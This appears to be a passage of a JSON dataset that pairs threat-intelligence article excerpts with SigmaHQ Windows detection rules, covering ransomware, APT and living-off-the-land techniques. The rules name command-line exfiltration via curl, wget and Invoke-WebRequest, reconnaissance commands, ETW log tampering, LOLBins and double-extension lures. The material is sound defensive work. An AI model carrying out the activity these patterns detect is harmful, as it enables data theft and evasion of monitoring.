        "https://www.sentinelone.com/blog/living-off-windows-defender-lockbit-ransomware-sideloads-cobalt-strike-through-microsoft-security-tool/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-08-02",
      "modified": "2023-07-27",
      "tags": [
        "attack.execution",
        "attack.t1059.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_iwr": {
          "Image|endswith": [
            "\\powershell.exe",
            "\\pwsh.exe",
            "\\cmd.exe"
          ],
          "CommandLine|contains": [
            "Invoke-WebRequest",
            "iwr ",
            "wget ",
            "curl "
          ],
          "CommandLine|contains|all": [
            " -ur",
            " -me",
            " -b",
            " POST "
          ]
        },
        "selection_curl": {
          "Image|endswith": "\\curl.exe",
          "CommandLine|contains": "--ur"
        },
        "selection_curl_data": {
          "CommandLine|contains": [
            " -d ",
            " --data "
          ]
        },
        "selection_wget": {
          "Image|endswith": "\\wget.exe",
          "CommandLine|contains": [
            "--post-data",
            "--post-file"
          ]
        },
        "payloads": [
          {
            "CommandLine|contains": [
              "Get-Content",
              "GetBytes",
              "hostname",
              "ifconfig",
              "ipconfig",
              "net view",
              "netstat",
              "nltest",
              "qprocess",
              "sc query",
              "systeminfo",
              "tasklist",
              "ToBase64String",
              "whoami"
            ]
          },
          {
            "CommandLine|contains|all": [
              "type ",
              " > ",
              " C:\\"
            ]
          }
        ],
        "condition": "(selection_iwr or all of selection_curl* or selection_wget) and payloads"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_data_exfiltration_via_cli.yml"
  },
  "527": {
    "url": "https://www.virustotal.com/gui/file/7872d8845a332dce517adae9c3389fde5313ff2fed38c2577f3b498da786db68/behavior",
    "markdown": "",
    "sigma_rule": {
      "title": "Suspicious Parent Double Extension File Execution",
      "id": "5e6a80c8-2d45-4633-9ef4-fa2671a39c5c",
      "related": [
        {
          "id": "1cdd9a09-06c9-4769-99ff-626e2b3991b8",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detect execution of suspicious double extension files in ParentCommandLine",
      "references": [
        "https://www.virustotal.com/gui/file/7872d8845a332dce517adae9c3389fde5313ff2fed38c2577f3b498da786db68/behavior",
        "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/bluebottle-banks-targeted-africa"
      ],
      "author": "frack113, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-06",
      "modified": "2023-02-28",
      "tags": [
        "attack.defense-evasion",
        "attack.t1036.007"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "ParentImage|endswith": [
              ".doc.lnk",
              ".docx.lnk",
              ".xls.lnk",
              ".xlsx.lnk",
              ".ppt.lnk",
              ".pptx.lnk",
              ".rtf.lnk",
              ".pdf.lnk",
              ".txt.lnk",
              ".doc.js",
              ".docx.js",
              ".xls.js",
              ".xlsx.js",
              ".ppt.js",
              ".pptx.js",
              ".rtf.js",
              ".pdf.js",
              ".txt.js"
            ]
          },
          {
            "ParentCommandLine|contains": [
              ".doc.lnk",
              ".docx.lnk",
              ".xls.lnk",
              ".xlsx.lnk",
              ".ppt.lnk",
              ".pptx.lnk",
              ".rtf.lnk",
              ".pdf.lnk",
              ".txt.lnk",
              ".doc.js",
              ".docx.js",
              ".xls.js",
              ".xlsx.js",
              ".ppt.js",
              ".pptx.js",
              ".rtf.js",
              ".pdf.js",
              ".txt.js"
            ]
          }
        ],
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_double_extension_parent.yml"
  },
  "528": {
    "url": "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/bluebottle-banks-targeted-africa",
    "markdown": "# Bluebottle: Campaign Hits Banks in French-speaking Countries in Africa **Continuation of previously documented activity leverages new TTPs.** Posted: 5 Jan, 2023 Threat Intelligence --- Bluebottle, a cyber-crime group that specializes in targeted attacks against the financial sector, is continuing to mount attacks on banks in Francophone countries. The group makes extensive use of living off the land, dual-use tools, and commodity malware, with no custom malware deployed in this campaign. The activity observed by Symantec, a division of Broadcom Software, appears to be a continuation of activity documented in a Group-IB report from November 2022. The activity documented by",
    "sigma_rule": {
      "title": "Suspicious Parent Double Extension File Execution",
      "id": "5e6a80c8-2d45-4633-9ef4-fa2671a39c5c",
      "related": [
        {
          "id": "1cdd9a09-06c9-4769-99ff-626e2b3991b8",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detect execution of suspicious double extension files in ParentCommandLine",
      "references": [
        "https://www.virustotal.com/gui/file/7872d8845a332dce517adae9c3389fde5313ff2fed38c2577f3b498da786db68/behavior",
        "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/bluebottle-banks-targeted-africa"
      ],
      "author": "frack113, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-06",
      "modified": "2023-02-28",
      "tags": [
        "attack.defense-evasion",
        "attack.t1036.007"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "ParentImage|endswith": [
              ".doc.lnk",
              ".docx.lnk",
              ".xls.lnk",
              ".xlsx.lnk",
              ".ppt.lnk",
              ".pptx.lnk",
              ".rtf.lnk",
              ".pdf.lnk",
              ".txt.lnk",
              ".doc.js",
              ".docx.js",
              ".xls.js",
              ".xlsx.js",
              ".ppt.js",
              ".pptx.js",
              ".rtf.js",
              ".pdf.js",
              ".txt.js"
            ]
          },
          {
            "ParentCommandLine|contains": [
              ".doc.lnk",
              ".docx.lnk",
              ".xls.lnk",
              ".xlsx.lnk",
              ".ppt.lnk",
              ".pptx.lnk",
              ".rtf.lnk",
              ".pdf.lnk",
              ".txt.lnk",
              ".doc.js",
              ".docx.js",
              ".xls.js",
              ".xlsx.js",
              ".ppt.js",
              ".pptx.js",
              ".rtf.js",
              ".pdf.js",
              ".txt.js"
            ]
          }
        ],
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_double_extension_parent.yml"
  },
  "529": {
    "url": "https://web.archive.org/web/20240122163849/https://www.x86matthew.com/view_post?id=embed_exe_lnk",
    "markdown": "# EmbedExeLnk - Embedding an EXE inside a LNK with automatic execution **Date:** 04/02/2022 I have seen various malicious LNK files in the wild. These link files generally execute a script (Powershell, VBScript, etc) which downloads an external payload. I set myself the challenge to create a LNK file with an EXE file embedded inside, without the need for external downloads. This was achieved by creating a LNK file with the EXE file appended to the end. The LNK file executes some Powershell commands to read the contents of the EXE from the end of the LNK, copies it to",
    "sigma_rule": {
      "title": "Hidden Powershell in Link File Pattern",
      "id": "30e92f50-bb5a-4884-98b5-d20aa80f3d7a",
      "status": "test",
      "description": "Detects events that appear when a user click on a link file with a powershell command in it",
      "references": [
        "https://web.archive.org/web/20240122163849/https://www.x86matthew.com/view_post?id=embed_exe_lnk"
      ],
      "author": "frack113",
      "date": "2022-02-06",
      "tags": [
        "attack.execution",
        "attack.t1059.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage": "C:\\Windows\\explorer.exe",
          "Image": "C:\\Windows\\System32\\cmd.exe",
          "CommandLine|contains|all": [
            "powershell",
            ".lnk"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate commands in .lnk files"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_embed_exe_lnk.yml"
  },
  "530": {
    "url": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil",
    "markdown": "# wevtutil Enables you to retrieve information about event logs and publishers. You can also use this command to install and uninstall event manifests, to run queries, and to export, archive, and clear logs. ## Syntax ``` wevtutil [{el | enum-logs}] [{gl | get-log} <Logname> [/f:<Format>]] [{sl | set-log} <Logname> [/e:<Enabled>] [/i:<Isolation>] [/lfn:<Logpath>] [/rt:<Retention>] [/ab:<Auto>] [/ms:<MaxSize>] [/l:<Level>] [/k:<Keywords>] [/ca:<Channel>] [/c:<Config>]] [{ep | enum-publishers}] [{gp | get-publisher} <Publishername> [/ge:<Metadata>] [/gm:<Message>] [/f:<Format>]] [{im | install-manifest} <Manifest>] [/rf:<Path>] [/mf:<Path>] [/pf:<Path>] [{um | uninstall-manifest} <Manifest>] [{qe | query-events} <Path> [/lf:<Logfile>] [/sq:<Structquery>] [/q:<Query>] [/bm:<Bookmark>] [/sbm:<Savebm>] [/rd:<Direction>] [/f:<Format>] [/l:<Locale>] [/c:<Count>] [/e:<Element>]] [{gli | get-loginfo} <Logname> [/lf:<Logfile>]]",
    "sigma_rule": {
      "title": "ETW Trace Evasion Activity",
      "id": "a238b5d0-ce2d-4414-a676-7a531b3d13d6",
      "status": "test",
      "description": "Detects command line activity that tries to clear or disable any ETW trace log which could be a sign of logging evasion.\n",
      "references": [
        "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil",
        "https://abuse.io/lockergoga.txt",
        "https://medium.com/palantir/tampering-with-windows-event-tracing-background-offense-and-defense-4be7ac62ac63"
      ],
      "author": "@neu5ron, Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community",
      "date": "2019-03-22",
      "modified": "2022-06-28",
      "tags": [
        "attack.defense-evasion",
        "attack.t1070",
        "attack.t1562.006",
        "car.2016-04-002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_clear_1": {
          "CommandLine|contains|all": [
            "cl",
            "/Trace"
          ]
        },
        "selection_clear_2": {
          "CommandLine|contains|all": [
            "clear-log",
            "/Trace"
          ]
        },
        "selection_disable_1": {
          "CommandLine|contains|all": [
            "sl",
            "/e:false"
          ]
        },
        "selection_disable_2": {
          "CommandLine|contains|all": [
            "set-log",
            "/e:false"
          ]
        },
        "selection_disable_3": {
          "CommandLine|contains|all": [
            "logman",
            "update",
            "trace",
            "--p",
            "-ets"
          ]
        },
        "selection_pwsh_remove": {
          "CommandLine|contains": "Remove-EtwTraceProvider"
        },
        "selection_pwsh_set": {
          "CommandLine|contains|all": [
            "Set-EtwTraceProvider",
            "0x11"
          ]
        },
        "condition": "1 of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_etw_trace_evasion.yml"
  },
  "531": {
    "url": "https://abuse.io/lockergoga.txt",
    "markdown": "# TLP-WHITE - Free to share **Last updated on 05-04-2019** (Note: Added FireEye report) ## Update: Full report: FireEye Blog - Pick Six: Intercepting a FIN6 Intrusion ### TLDR; - FireEye has observed FIN6 conducting intrusions to deploy either Ryuk or LockerGoga ransomware. - The initial phase of an intrusion involves using stolen credentials to access an internet-facing system and moving laterally using Windows' Remote Desktop Protocol (RDP). - Using Cobalt Strike, Metasploit, and publicly available tools such as Adfind and 7-Zip to conduct internal reconnaissance, compress data, and aid their overall mission. - Using PowerShell to execute encoded command(s)",
    "sigma_rule": {
      "title": "ETW Trace Evasion Activity",
      "id": "a238b5d0-ce2d-4414-a676-7a531b3d13d6",
      "status": "test",
      "description": "Detects command line activity that tries to clear or disable any ETW trace log which could be a sign of logging evasion.\n",
      "references": [
        "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil",
        "https://abuse.io/lockergoga.txt",
        "https://medium.com/palantir/tampering-with-windows-event-tracing-background-offense-and-defense-4be7ac62ac63"
      ],
      "author": "@neu5ron, Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community",
      "date": "2019-03-22",
      "modified": "2022-06-28",
      "tags": [
        "attack.defense-evasion",
        "attack.t1070",
        "attack.t1562.006",
        "car.2016-04-002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_clear_1": {
          "CommandLine|contains|all": [
            "cl",
            "/Trace"
          ]
        },
        "selection_clear_2": {
          "CommandLine|contains|all": [
            "clear-log",
            "/Trace"
          ]
        },
        "selection_disable_1": {
          "CommandLine|contains|all": [
            "sl",
            "/e:false"
          ]
        },
        "selection_disable_2": {
          "CommandLine|contains|all": [
            "set-log",
            "/e:false"
          ]
        },
        "selection_disable_3": {
          "CommandLine|contains|all": [
            "logman",
            "update",
            "trace",
            "--p",
            "-ets"
          ]
        },
        "selection_pwsh_remove": {
          "CommandLine|contains": "Remove-EtwTraceProvider"
        },
        "selection_pwsh_set": {
          "CommandLine|contains|all": [
            "Set-EtwTraceProvider",
            "0x11"
          ]
        },
        "condition": "1 of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_etw_trace_evasion.yml"
  },
  "532": {
    "url": "https://medium.com/palantir/tampering-with-windows-event-tracing-background-offense-and-defense-4be7ac62ac63",
    "markdown": "# Tampering with Windows Event Tracing: Background, Offense, and Defense **Dec 24, 2018** --- Event Tracing for Windows (ETW) is the mechanism Windows uses to trace and log system events. Attackers often clear event logs to cover their tracks. Though the act of clearing an event log itself generates an event, attackers who know ETW well may take advantage of tampering opportunities to cease the flow of logging temporarily or even permanently, without generating any event log entries in the process. The Windows event log is the data source for many of the Palantir Critical Incident Response Team’s Alerting and",
    "sigma_rule": {
      "title": "ETW Trace Evasion Activity",
      "id": "a238b5d0-ce2d-4414-a676-7a531b3d13d6",
      "status": "test",
      "description": "Detects command line activity that tries to clear or disable any ETW trace log which could be a sign of logging evasion.\n",
      "references": [
        "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil",
        "https://abuse.io/lockergoga.txt",
        "https://medium.com/palantir/tampering-with-windows-event-tracing-background-offense-and-defense-4be7ac62ac63"
      ],
      "author": "@neu5ron, Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community",
      "date": "2019-03-22",
      "modified": "2022-06-28",
      "tags": [
        "attack.defense-evasion",
        "attack.t1070",
        "attack.t1562.006",
        "car.2016-04-002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_clear_1": {
          "CommandLine|contains|all": [
            "cl",
            "/Trace"
          ]
        },
        "selection_clear_2": {
          "CommandLine|contains|all": [
            "clear-log",
            "/Trace"
          ]
        },
        "selection_disable_1": {
          "CommandLine|contains|all": [
            "sl",
            "/e:false"
          ]
        },
        "selection_disable_2": {
          "CommandLine|contains|all": [
            "set-log",
            "/e:false"
          ]
        },
        "selection_disable_3": {
          "CommandLine|contains|all": [
            "logman",
            "update",
            "trace",
            "--p",
            "-ets"
          ]
        },
        "selection_pwsh_remove": {
          "CommandLine|contains": "Remove-EtwTraceProvider"
        },
        "selection_pwsh_set": {
          "CommandLine|contains|all": [
            "Set-EtwTraceProvider",
            "0x11"
          ]
        },
        "condition": "1 of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_etw_trace_evasion.yml"
  },
  "533": {
    "url": "https://redcanary.com/blog/blackbyte-ransomware/",
    "markdown": "## ProxyShell exploitation leads to BlackByte ransomware The BlackByte ransomware operators leverage ProxyShell Microsoft Exchange vulnerabilities for initial access along with Cobalt Strike for lateral movement. Here’s what to look out for. **Originally published:** November 30, 2021 **Last modified:** April 30, 2024 --- As law enforcement arrests continue to put a dent in the plague of ransomware, new variants continue to pop up week after week. BlackByte ransomware was first publicly identified in a July 2021 BleepingComputer forum post from a user seeking help decrypting their encrypted files. Since then, there’s been a slow trickle of information regarding this new",
    "sigma_rule": {
      "title": "Potentially Suspicious Execution From Parent Process In Public Folder",
      "id": "69bd9b97-2be2-41b6-9816-fb08757a4d1a",
      "status": "test",
      "description": "Detects a potentially suspicious execution of a parent process located in the \"\\Users\\Public\" folder executing a child process containing references to shell or scripting binaries and commandlines.\n",
      "references": [
        "https://redcanary.com/blog/blackbyte-ransomware/"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-02-25",
      "modified": "2024-07-12",
      "tags": [
        "attack.defense-evasion",
        "attack.execution",
        "attack.t1564",
        "attack.t1059"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_parent": {
          "ParentImage|contains": ":\\Users\\Public\\"
        },
        "selection_child": [
          {
            "Image|endswith": [
              "\\bitsadmin.exe",
              "\\certutil.exe",
              "\\cmd.exe",
              "\\cscript.exe",
              "\\mshta.exe",
              "\\powershell.exe",
              "\\pwsh.exe",
              "\\regsvr32.exe",
              "\\rundll32.exe",
              "\\wscript.exe"
            ]
          },
          {
            "CommandLine|contains": [
              "bitsadmin",
              "certutil",
              "cscript",
              "mshta",
              "powershell",
              "regsvr32",
              "rundll32",
              "wscript"
            ]
          }
        ],
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_execution_from_public_folder_as_parent.yml"
  },
  "534": {
    "url": "https://securelist.com/muddywater/88059/",
    "markdown": "# MuddyWater expands operations **APT reports** **10 Oct 2018** ## Table of Contents - Summary - Decoy images by country - Jordan - Turkey - Saudi Arabia - Azerbaijan - Iraq - Pakistan - Afghanistan - Technical details - The initial infection vector - The macro payload analysis, dropped files and registry keys - Case 1: INF, SCT and text files dropped by the macro - Case 2: VBS and text files dropped by the macro - The PowerShell code - CnC communication - Victim system reconnaissance - Supported commands - Victimology - Attacker deception and attribution - Recommendations for",
    "sigma_rule": {
      "title": "Suspicious File Characteristics Due to Missing Fields",
      "id": "9637e8a5-7131-4f7f-bdc7-2b05d8670c43",
      "status": "test",
      "description": "Detects Executables in the Downloads folder without FileVersion,Description,Product,Company likely created with py2exe",
      "references": [
        "https://securelist.com/muddywater/88059/",
        "https://www.virustotal.com/#/file/276a765a10f98cda1a38d3a31e7483585ca3722ecad19d784441293acf1b7beb/detection"
      ],
      "author": "Markus Neis, Sander Wiebing",
      "date": "2018-11-22",
      "modified": "2022-10-09",
      "tags": [
        "attack.execution",
        "attack.t1059.006"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection1": {
          "Description": "\\?",
          "FileVersion": "\\?"
        },
        "selection2": {
          "Description": "\\?",
          "Product": "\\?"
        },
        "selection3": {
          "Description": "\\?",
          "Company": "\\?"
        },
        "folder": {
          "Image|contains": "\\Downloads\\"
        },
        "condition": "(selection1 or selection2 or selection3) and folder"
      },
      "fields": [
        "CommandLine",
        "ParentCommandLine"
      ],
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_file_characteristics.yml"
  },
  "535": {
    "url": "https://www.virustotal.com/#/file/276a765a10f98cda1a38d3a31e7483585ca3722ecad19d784441293acf1b7beb/detection",
    "markdown": "",
    "sigma_rule": {
      "title": "Suspicious File Characteristics Due to Missing Fields",
      "id": "9637e8a5-7131-4f7f-bdc7-2b05d8670c43",
      "status": "test",
      "description": "Detects Executables in the Downloads folder without FileVersion,Description,Product,Company likely created with py2exe",
      "references": [
        "https://securelist.com/muddywater/88059/",
        "https://www.virustotal.com/#/file/276a765a10f98cda1a38d3a31e7483585ca3722ecad19d784441293acf1b7beb/detection"
      ],
      "author": "Markus Neis, Sander Wiebing",
      "date": "2018-11-22",
      "modified": "2022-10-09",
      "tags": [
        "attack.execution",
        "attack.t1059.006"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection1": {
          "Description": "\\?",
          "FileVersion": "\\?"
        },
        "selection2": {
          "Description": "\\?",
          "Product": "\\?"
        },
        "selection3": {
          "Description": "\\?",
          "Company": "\\?"
        },
        "folder": {
          "Image|contains": "\\Downloads\\"
        },
        "condition": "(selection1 or selection2 or selection3) and folder"
      },
      "fields": [
        "CommandLine",
        "ParentCommandLine"
      ],
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_file_characteristics.yml"
  },
  "536": {
    "url": "https://posts.slayerlabs.com/living-off-the-land/#gathernetworkinfovbs",
    "markdown": "# Living off the land *April 25, 2021* > **Note** > 🍄Interested in leveling up your **Windows & AD Pentesting** skills? Checkout our Udemy course and get **Free 7-day** lab access with proof of purchase! This post will run through a scenario showcasing multiple methods of living off the land with built-in Windows assemblies (aka LOLBins). This scenario takes place on TheSprawl, one of our pentesting ranges. The lab scenario simply functions to emulate **exfil and lateral movement** utilizing built-in Windows tools. At the end we’ll briefly run through some artifacts and logs. Keep in mind these methods may not",
    "sigma_rule": {
      "title": "Suspicious Reconnaissance Activity Via GatherNetworkInfo.VBS",
      "id": "07aa184a-870d-413d-893a-157f317f6f58",
      "related": [
        {
          "id": "f92a6f1e-a512-4a15-9735-da09e78d7273",
          "type": "similar"
        },
        {
          "id": "575dce0c-8139-4e30-9295-1ee75969f7fe",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects execution of the built-in script located in \"C:\\Windows\\System32\\gatherNetworkInfo.vbs\". Which can be used to gather information about the target machine",
      "references": [
        "https://posts.slayerlabs.com/living-off-the-land/#gathernetworkinfovbs",
        "https://www.mandiant.com/resources/blog/trojanized-windows-installers-ukrainian-government"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-02-08",
      "tags": [
        "attack.discovery",
        "attack.execution",
        "attack.t1615",
        "attack.t1059.005"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains": "gatherNetworkInfo.vbs"
        },
        "filter": {
          "Image|endswith": [
            "\\cscript.exe",
            "\\wscript.exe"
          ]
        },
        "condition": "selection and not filter"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_gather_network_info_execution.yml"
  },
  "537": {
    "url": "https://www.mandiant.com/resources/blog/trojanized-windows-installers-ukrainian-government",
    "markdown": "# Trojanized Windows 10 Operating System Installers Targeted Ukrainian Government **Published on:** December 15, 2022 **Tags:** Threat Intelligence --- ## Executive Summary - Mandiant identified an operation focused on the Ukrainian government via trojanized Windows 10 Operating System installers. These were distributed via torrent sites in a supply chain attack. - Threat activity tracked as UNC4166 likely trojanized and distributed malicious Windows Operating system installers which drop malware that conducts reconnaissance and deploys additional capability on some victims to conduct data theft. - The trojanized files use the Ukrainian language pack and are designed to target Ukrainian users. Following compromise,",
    "sigma_rule": {
      "title": "Suspicious Reconnaissance Activity Via GatherNetworkInfo.VBS",
      "id": "07aa184a-870d-413d-893a-157f317f6f58",
      "related": [
        {
          "id": "f92a6f1e-a512-4a15-9735-da09e78d7273",
          "type": "similar"
        },
        {
          "id": "575dce0c-8139-4e30-9295-1ee75969f7fe",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects execution of the built-in script located in \"C:\\Windows\\System32\\gatherNetworkInfo.vbs\". Which can be used to gather information about the target machine",
      "references": [
        "https://posts.slayerlabs.com/living-off-the-land/#gathernetworkinfovbs",
        "https://www.mandiant.com/resources/blog/trojanized-windows-installers-ukrainian-government"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-02-08",
      "tags": [
        "attack.discovery",
        "attack.execution",
        "attack.t1615",
        "attack.t1059.005"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains": "gatherNetworkInfo.vbs"
        },
        "filter": {
          "Image|endswith": [
            "\\cscript.exe",
            "\\wscript.exe"
          ]
        },
        "condition": "selection and not filter"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_gather_network_info_execution.yml"
  },
  "538": {
    "url": "https://thedfirreport.com/2020/04/20/sqlserver-or-the-miner-in-the-basement/",
    "markdown": "# Sqlserver, or the Miner in the Basement **Categories:** cryptominer, rdp **Published on:** April 20, 2020 A threat actor logged into the honeypot via RDP and installed XMRig with multiple persistence mechanisms. The actor used `icacls` and `attrib` to lock down directories and files to make detection and eradication difficult. While bitcoin was at $20K, actors dropping mining software was all the rage, but with Bitcoin and most currencies less than half their peak value you’d be forgiven thinking the malicious cryptominer has gone away. These days the news points to big game ransomware as the hottest threat actor trend.",
    "sigma_rule": {
      "title": "Writing Of Malicious Files To The Fonts Folder",
      "id": "ae9b0bd7-8888-4606-b444-0ed7410cb728",
      "status": "test",
      "description": "Monitors for the hiding possible malicious files in the C:\\Windows\\Fonts\\ location. This folder doesn't require admin privillege to be written and executed from.",
      "references": [
        "https://thedfirreport.com/2020/04/20/sqlserver-or-the-miner-in-the-basement/"
      ],
      "author": "Sreeman",
      "date": "2020-04-21",
      "modified": "2022-03-08",
      "tags": [
        "attack.t1211",
        "attack.t1059",
        "attack.defense-evasion",
        "attack.persistence"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_1": {
          "CommandLine|contains": [
            "echo",
            "copy",
            "type",
            "file createnew",
            "cacls"
          ]
        },
        "selection_2": {
          "CommandLine|contains": "C:\\Windows\\Fonts\\"
        },
        "selection_3": {
          "CommandLine|contains": [
            ".sh",
            ".exe",
            ".dll",
            ".bin",
            ".bat",
            ".cmd",
            ".js",
            ".msh",
            ".reg",
            ".scr",
            ".ps",
            ".vb",
            ".jar",
            ".pl",
            ".inf",
            ".cpl",
            ".hta",
            ".msi",
            ".vbs"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_hiding_malware_in_fonts_folder.yml"
  },
  "539": {
    "url": "https://redcanary.com/threat-detection-report/threats/socgholish/#threat-socgholish",
    "markdown": "# SocGholish Our number one threat of 2024, SocGholish leverages drive-by-downloads masquerading as software updates to trick visitors of compromised websites into executing malware. **Overall Rank:** 5 **Customers Affected:** 4.9% --- ## Analysis SocGholish is a malware family that leverages drive-by-downloads masquerading as software updates for initial access. Active since at least April 2018, SocGholish has been linked to the suspected Russian cybercrime group **Evil Corp**. As in past years, Red Canary observed SocGholish impacting a wide variety of industry verticals in 2024. Continuing trends observed in **2022** and 2023, SocGholish activity spiked in March, however 2024 also saw a",
    "sigma_rule": {
      "title": "Potential Homoglyph Attack Using Lookalike Characters",
      "id": "32e280f1-8ad4-46ef-9e80-910657611fbc",
      "status": "test",
      "description": "Detects the presence of unicode characters which are homoglyphs, or identical in appearance, to ASCII letter characters.\nThis is used as an obfuscation and masquerading techniques. Only \"perfect\" homoglyphs are included; these are characters that\nare indistinguishable from ASCII characters and thus may make excellent candidates for homoglyph attack characters.\n",
      "references": [
        "https://redcanary.com/threat-detection-report/threats/socgholish/#threat-socgholish",
        "http://www.irongeek.com/homoglyph-attack-generator.php"
      ],
      "author": "Micah Babinski, @micahbabinski",
      "date": "2023-05-07",
      "tags": [
        "attack.defense-evasion",
        "attack.t1036",
        "attack.t1036.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_upper": {
          "CommandLine|contains": [
            "А",
            "В",
            "Е",
            "К",
            "М",
            "Н",
            "О",
            "Р",
            "С",
            "Т",
            "Х",
            "Ѕ",
            "І",
            "Ј",
            "Ү",
            "Ӏ",
            "Ԍ",
            "Ԛ",
            "Ԝ",
            "Α",
            "Β",
            "Ε",
            "Ζ",
            "Η",
            "Ι",
            "Κ",
            "Μ",
            "Ν",
            "Ο",
            "Ρ",
            "Τ",
            "Υ",
            "Χ"
          ]
        },
        "selection_lower": {
          "CommandLine|contains": [
            "а",
            "е",
            "о",
            "р",
            "с",
            "х",
            "ѕ",
            "і",
            "ӏ",
            "ј",
            "һ",
            "ԁ",
            "ԛ",
            "ԝ",
            "ο"
          ]
        },
        "condition": "1 of selection_*"
      },
      "falsepositives": [
        "Commandlines with legitimate Cyrillic text; will likely require tuning (or not be usable) in countries where these alphabets are in use."
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_homoglyph_cyrillic_lookalikes.yml"
  },
  "540": {
    "url": "http://www.irongeek.com/homoglyph-attack-generator.php",
    "markdown": "# Homoglyph Attack Generator This app is meant to make it easier to generate homographs based on Homoglyphs than having to search for look-a-like character in Unicode, then coping and pasting. Please use only for legitimate pen-test purposes and user awareness training. I also recommend webapp developers use it to test out possible user impersonation attacks in their code. This is still a work in progress, so please send me suggestions (especially for new Homoglyphs to add). While this tool was designed with making IDNA/Punycode names for putting into DNS to display foreign characters in a browsers URL bar, it",
    "sigma_rule": {
      "title": "Potential Homoglyph Attack Using Lookalike Characters",
      "id": "32e280f1-8ad4-46ef-9e80-910657611fbc",
      "status": "test",
      "description": "Detects the presence of unicode characters which are homoglyphs, or identical in appearance, to ASCII letter characters.\nThis is used as an obfuscation and masquerading techniques. Only \"perfect\" homoglyphs are included; these are characters that\nare indistinguishable from ASCII characters and thus may make excellent candidates for homoglyph attack characters.\n",
      "references": [
